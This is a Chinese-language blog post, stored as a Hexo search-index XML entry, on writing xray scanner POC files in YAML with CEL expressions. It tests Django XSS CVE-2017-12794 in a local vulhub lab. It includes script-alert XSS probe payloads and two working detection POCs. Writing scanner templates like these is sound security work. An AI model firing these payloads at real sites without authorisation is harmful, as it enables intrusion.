<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>编写第一个POC</title>
      <link href="/2023/09/28/%E7%BC%96%E5%86%99%E7%AC%AC%E4%B8%80%E4%B8%AAPOC/"/>
      <url>/2023/09/28/%E7%BC%96%E5%86%99%E7%AC%AC%E4%B8%80%E4%B8%AAPOC/</url>
      
        <content type="html"><![CDATA[<h2 id="博客由来"><a href="#博客由来" class="headerlink" title="博客由来"></a>博客由来</h2><p>最近有个面试官问了我一个问题，他看我用过xray就问我知不知道xray检测xss漏洞的原理是什么，毫无疑问，像我这种只使用过其基础功能的人肯定是不知道的。在以往的面试过程中，我也总是会遇到一些我知其然而不知其所以然的问题，即只会用，而不知道原理，或者知道原理，却没有真正上手实操过，面试官一旦深入问下去，就立马现出（菜菜的）原形（QAQ）。</p><p>因此，为了直击痛点，接下来我将会逐步把这些我不知道的问题弄明白，并将其记录下来，一方面是在回顾的过程中学习，另一方面也是为了扩充自己的知识面，积累技能。</p><p>那话不多说，下面就让我们详细了解一下xray是如何检测xss漏洞的吧！</p><h2 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h2><p>根据xray的官方文档<a href="https://docs.xray.cool/#/README">https://docs.xray.cool/#/README</a>，xray是一款功能强大的安全评估工具，支持多种类型漏洞的检测，在我看来，真正支持这些功能实现的就是各种各样的POC。</p><p>因此，我们需要先学习一下POC和EXP的概念。</p><h2 id="POC和EXP"><a href="#POC和EXP" class="headerlink" title="POC和EXP"></a>POC和EXP</h2><p>根据xray相关知识文档<a href="https://www.yuque.com/jarciscy/zkonow/guy5iz">https://www.yuque.com/jarciscy/zkonow/guy5iz</a>，可以总结如下：</p><p><strong>POC(Proof of Concept) - 利用证明</strong></p><ul><li><code>POC</code>，<code>Proof of Concept</code>，意思是 <code>利用证明</code>。可使得使用者能够确认这个<code>漏洞是真实存在的</code>，在编写<code>POC</code>时需要注意其必须是无害的，即它的目的是检测漏洞的存在，而不是对被检测系统产生影响（如上传shell文件未删除、对数据库中的数据进行增删改等）。</li></ul><p><strong>EXP(Exploit) - 漏洞利用</strong></p><ul><li><code>EXP，Exploit</code> 中文意思是 <code>漏洞利用</code>。意思是一段对漏洞<code>如何利用的详细说明或者一个演示的漏洞攻击代码</code>，可以使得使用者<code>完全了解漏洞</code>的机理以及<code>利用的方法</code>。</li></ul><p>不过，如果我们需要xray使用我们自己编写的POC，就必须使用xray支持的POC规则，即使用YAML格式编写。YAML是一种文档编写格式，是JSON的超集。</p><h2 id="POC脚本格式（V2版）"><a href="#POC脚本格式（V2版）" class="headerlink" title="POC脚本格式（V2版）"></a>POC脚本格式（V2版）</h2><p>一个最基础的POC如下：</p><pre><code class="yaml">name: poc-yaml-example-com# 脚本部分transport: httprules:  r1:    request:      method: GET      path: &quot;/&quot;    expression: |      response.status==200 &amp;&amp; response.body_string.contains(&quot;Example Domain&quot;)expression:  r1()# 信息部分detail:  author: name(link)  links:    - http://example.com</code></pre><p>整个 POC 大致可以分为 3 部分：</p><ul><li>名称： 脚本名称，string 类型</li><li>脚本部分：主要逻辑控制部分，控制着脚本的运行过程</li><li>信息部分：主要是用来声明该脚本的一些信息，包括输出内容</li></ul><p>接下来分别介绍一个各个部分的格式和内容。</p><h3 id="脚本部分"><a href="#脚本部分" class="headerlink" title="脚本部分"></a>脚本部分</h3><p>这个部分包含 4 部分内容，分别为：</p><ul><li>传输方式（transport）</li><li>全局变量定义（set）</li><li>规则描述（rules）</li><li>规则表达式（expression）</li></ul><h3 id="信息部分"><a href="#信息部分" class="headerlink" title="信息部分"></a>信息部分</h3><p>该字段用于定义一些和脚本相关的信息。内容都为非必填内容。</p><h3 id="expression编写"><a href="#expression编写" class="headerlink" title="expression编写"></a>expression编写</h3><p>xray使用编译性语言Golang，为了实现动态执行一些规则，我们需要使用Common Expression Language (CEL)表达式。CEL表达式项目可以参考<a href="https://github.com/google/cel-spec%E9%A1%B9%E7%9B%AE%E3%80%82">https://github.com/google/cel-spec项目。</a></p><p>上述示例中的表达式：</p><pre><code class="yaml">response.status==200 &amp;&amp; response.body_string.contains(&quot;Example Domain&quot;)CopyErrorCopied</code></pre><p>上述表达式的意思是：<strong>返回包status等于200，且body中包含内容“Example Domain”</strong>。</p><p>expression表达式上下文还包含有一些常用的函数。比如上述 <code>bcontains</code> 用来匹配 bytes 是否包含，类似的，如果要匹配 string 的包含，可以使用 <code>contains</code>, 如：</p><pre><code class="yaml">response.content_type.contains(&quot;json&quot;)</code></pre><p><strong>一些表达式例子：</strong></p><pre><code class="yaml">response.body.bcontains(b&quot;test&quot;)</code></pre><p>返回包 body 包含 test，因为 body 是一个 bytes 类型的变量，所以我们需要使用 bcontains 方法，且其参数也是 bytes</p><pre><code class="yaml">response.body_string.contains(&quot;test&quot;)</code></pre><p>但此处我们更推荐这样的写法来匹配test，这会解决一些编码问题</p><pre><code class="yaml">response.body_string.contains(r1 + &quot;some value&quot; + r2)</code></pre><p>r1、r2是 randomLowercase 的变量，这里动态的判断 body 的内容</p><pre><code class="yaml">response.content_type.contains(&#39;application/octet-stream&#39;) &amp;&amp; response.body.bcontains(b&#39;\x00\x01\x02&#39;)</code></pre><p>返回包的 content-type 包含 application&#x2F;octet-stream，且 body 中包含 0x000102 这段二进制串</p><pre><code class="yaml">response.content_type.contains(&#39;zip&#39;) &amp;&amp; r&#39;^PK\x03\x04&#39;.bmatches(response.body)</code></pre><p>这个规则用来判断返回的内容是否是zip文件，需要同时满足条件：content-type 包含关键字 “zip”，且 body 匹配上正则r’^PK\x03\x04’（就是zip的文件头）。因为 startsWith 方法只支持字符串的判断，所以这里没有使用。</p><pre><code class="yaml">response.status &gt;= 300 &amp;&amp; response.status &lt; 400</code></pre><p>返回包的 status code 在 300~400 之间</p><pre><code class="yaml">(response.status &gt;= 500 &amp;&amp; response.status != 502) || &quot;&lt;input value=\&quot;(.+?)\&quot;&quot;.matches(response.body_string)</code></pre><p>返回包status code大于等于500且不等于502，或者Body包含表单</p><pre><code class="yaml">response.headers[&#39;location&#39;]==&quot;https://www.example.com&quot;</code></pre><p>headers 中 <code>Location</code> 等于指定值，如果 <code>Location</code> 不存在，该表达式返回 false</p><pre><code class="yaml">&#39;docker-distribution-api-version&#39; in response.headers &amp;&amp; response.headers[&#39;docker-distribution-api-version&#39;].contains(&#39;registry/2.0&#39;)</code></pre><p>headers 中包含 <code>docker-distribution-api-version</code> 并且 value 包含指定字符串，如果不判断 <code>in</code>，后续的 contains 会出错。</p><pre><code class="yaml">response.body_string.contains(response.url.path)</code></pre><p>body 中包含 url 的 path。</p><p>expression表达式返回的必须是一个bool类型的结果。</p><h2 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h2><p>xray使用POC进行扫描时，POC模块在收到用户的一个请求后，开始对这个目标进行漏洞扫描。根据Rule中的<code>method</code>、<code>path</code>、<code>headers</code>、<code>body</code>、<code>follow_redirects</code>键值，替换原始数据包中的对应信息。</p><p>替换后的数据包被发送，并获得返回包，再执行expression表达式，表达式结果作为该条Rule的结果；同时，我们通过search指定的正则表达式，可以从返回包body中提取一些信息，作为下一个rule，或detail中可以被引用的内容。</p><p>通过写一个固定的yaml文件，让xray以这个yaml文件的内容进行发包，再通过返回包来判断是否存在漏洞。具体的规则在yaml文件中定义，我们需要告诉xray应该发一个什么样的包，以及返回包中需要包含什么信息。而这个yaml文件的内容就是我们需要编写的POC。</p><p>如果不熟悉YAML格式，可以使用POC编写的在线辅助工具：<a href="https://phith0n.github.io/xray-poc-generation/">https://phith0n.github.io/xray-poc-generation/</a></p><p>这里，以django的一个xss漏洞CVE-2017-12794为例，编写xray可以扫描的高质量POC。</p><p><strong>漏洞环境：</strong><a href="https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794">https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794</a></p><p>用docker容器运行，访问目标页面<a href="http://localhost:8000/create_user/">http://localhost:8000/create_user/</a></p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202309292251797.png" alt="image-20230929220843276" style="zoom:67%;" /><p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202309292252960.png" alt="image-20230929162640044"></p><p><strong>漏洞描述：</strong></p><p>访问<code>http://localhost:8000/create_user/?username=&lt;script&gt;alert(1)&lt;/script&gt;</code>创建一个用户，成功。</p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202309292252730.png" alt="image-20230929162926425" style="zoom:67%;" /><p><strong>Burp抓包截图：</strong></p><p><strong>注：</strong>这里把alert(2)看成alert(1)，因为第一次插入js代码时没有开启代理，所以这里将第一次访问<code>http://localhost:8000/create_user/?username=&lt;script&gt;alert(2)&lt;/script&gt;</code>的结果看成第一次访问<code>http://localhost:8000/create_user/?username=&lt;script&gt;alert(2)&lt;/script&gt;</code>的结果。</p><p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202309292252946.png" alt="image-20230929165628531"></p><p>再次访问<code>http://localhost:8000/create_user/?username=&lt;script&gt;alert(1)&lt;/script&gt;</code>，触发异常，弹出1。</p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202309292253221.png" alt="image-20230929163203821" style="zoom:67%;" /><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202309292253691.png" alt="image-20230929163107471" style="zoom:67%;" /><p>可见，Postgres抛出的异常为</p><pre><code>duplicate key value violates unique constraint &quot;xss_user_username_key&quot;DETAIL:  Key (username)=(&lt;script&gt;alert(1)&lt;/script&gt;) already exists.</code></pre><p>这个异常被拼接进<code>The above exception (&#123;&#123; frame.exc_cause &#125;&#125;) was the direct cause of the following exception</code>，最后触发XSS。</p><p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202309292253472.png" alt="image-20230929163324634"></p><p><strong>Burp抓包截图：</strong></p><p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202309292253700.png" alt="image-20230929165819209"></p><p><strong>我们可以根据这两次访问的请求包和返回包编写POC。</strong></p><p>第一次访问<code>poc-yaml-django-cve-2017-12794-xss-1.yml</code></p><pre><code class="yaml">name: poc-yaml-django-cve-2017-12794-xss-1manual: truetransport: httprules:    r1:        request:            cache: true            method: GET            path: /?username=%3Cscript%3Ealert(42)%3C/script%3E            follow_redirects: true        expression: response.status == 200expression: r1()detail:    author: test-xss-1    links:        - https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794</code></pre><p>第二次访问<code>poc-yaml-django-cve-2017-12794-xss-2.yml</code></p><pre><code class="yaml">name: poc-yaml-django-cve-2017-12794-xss-2manual: truetransport: httprules:    r2:        request:            cache: true            method: GET            path: /?username=%3Cscript%3Ealert(42)%3C/script%3E            follow_redirects: true        expression: response.status == 500 &amp;&amp; response.body.bcontains(b&quot;(username)=(&lt;script&gt;alert(42)&lt;/script&gt;) already exists.&quot;)expression: r2()detail:    author: test-xss-2    links:        - https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794</code></pre><p>使用xray分别运行POC，成功检测出xss漏洞。</p><p><img src="https://m4c0ndo-post-image.oss-cn-beijing.aliyuncs.com/img/202309292253204.png" alt="ebde7a765b86e616024f421882cd2a18"></p><h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><p>这里有一个很坑的地方，如果POC像下面这么写，那么r1()和r2()将永远只会有一个匹配，因为发出的请求是一样的，所以xray在解析的时候并不会重发两次，导致每次运行时，只能访问一次目标URL。这里我找了很久的原因，因为将r1()和r2()拆成两个POC进行检测的话，根据两个条件同时成立来判断，django是存在xss漏洞的；但是如果像下面这样写在一起，就会导致r1()和r2()永远不会同时为真，从而检测不出漏洞来。</p><pre><code class="yaml">name: poc-yaml-django-cve-2017-12794-xssmanual: truetransport: httprules:    r1:        request:            cache: true            method: GET            path: /?username=%3Cscript%3Ealert(42)%3C/script%3E            follow_redirects: true        expression: response.status == 200     r2:        request:            cache: true            method: GET            path: /?username=%3Cscript%3Ealert(42)%3C/script%3E            follow_redirects: true        expression: response.status == 500 &amp;&amp; response.body.bcontains(b&quot;(username)=(&lt;script&gt;alert(42)&lt;/script&gt;) already exists.&quot;)expression: r1() &amp;&amp; r2()detail:    author: test-xss    links:        - https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794</code></pre><p>对于这个问题，我在查找xray相关知识文档<a href="https://www.yuque.com/jarciscy/zkonow/ohst4v">https://www.yuque.com/jarciscy/zkonow/ohst4v</a>时发现有下面这段说明，即当r1()和r2()写在一起时，第二个url不会被执行。</p><p>目前版本的实现对 <strong>新的请求</strong>定义为 <strong>新的目录</strong>，比如下面几个 url 依次进入检查队列时，执行情况如下：</p><pre><code class="html">http://exmaple.com/     会执行, 上下文为 / http://example.com/a    不会再次执行，因为上下文同样为 /http://example.com/a/b  会执行，上下文为 /a/http://example.com/a/c/ 不会执行, 超过深度限制 (depth)</code></pre><p>其中 <code>depth</code> 是 phantasm 插件的一个配置项，用于指定检测深度。</p><p>因此，我只能将r1()规则和r2()规则写成两个POC，分别运行，根据r2()的规则进行最终的判断。这里我还没想到如何让两个规则写在同一个yaml文件中并且有效运行，也没办法在写xray扫描命令时同时指定这两个POC，使其几乎同时运行，并且只用输入一次命令。因为即使是这样，xray扫描时也只会运行第一个POC。之后会再好好思考一下这个问题应该如何解决，因为像这样写在两个POC里面，就没办法生成相同的随机数了，即没办法做下一步——<strong>优化</strong>。</p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p><strong>如何编写一个高质量的POC？</strong></p><p>参考：<a href="https://www.yuque.com/jarciscy/zkonow/fnlawo">https://www.yuque.com/jarciscy/zkonow/fnlawo</a></p><p>我们在考量一个POC是否优质，是否高质量，主要是参考以下的内容：</p><ol><li><p>payload是否<strong>无害</strong></p></li><li><p>payload是否<strong>合理</strong></p><ol><li><p>是否随机化</p></li><li><p>是否已经是最精简的探测</p></li></ol></li><li><p>payload是否通用</p></li><li><p>对返回包的判断是否严谨</p></li><li><p>整体的请求是否符合逻辑</p></li></ol><p>而这些内容其主要影响的就是扫描的效果，其影响效果可以简单的看作：<strong>漏报、误报、危害</strong></p><p>因为我们的POC在加载到扫描器后，会遇到非常多的目标，所以如果不编写一个高质量的POC，就很容易出现上述的情况。</p><p>我们首要关注的便是<strong>危害性</strong>，然后借用<a href="https://paper.seebug.org/9/">《漏洞检测的那些事儿》</a>中提到的三个编写标准“<strong>随机性、确定性、通用性</strong>”，便构成了高质量POC。</p><h3 id="随机化"><a href="#随机化" class="headerlink" title="随机化"></a>随机化</h3><p>比如，在编写r2()规则所在的POC时，可以像下面这样随机化处理。（<strong>注：</strong>由于上面提到的原因，这里实际并不能使用随机变量。）</p><pre><code class="yaml">name: poc-yaml-django-cve-2017-12794-xss-2manual: truetransport: httpset:    randomNum: randomLowercase(6)rules:    r2:        request:            cache: true            method: GET            path: /?username=%3Cscript%3Ealert(&#123;&#123;randomNum&#125;&#125;)%3C/script%3E            follow_redirects: true        expression: response.status == 500 &amp;&amp; response.body.bcontains(b&quot;(username)=(&lt;script&gt;alert(&quot; + randomNum + &quot;)&lt;/script&gt;) already exists.&quot;)expression: r2()detail:    author: test-xss-2    links:        - https://github.com/vulhub/vulhub/tree/master/django/CVE-2017-12794</code></pre>]]></content>
      
      
      <categories>
          
          <category> POC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xray </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
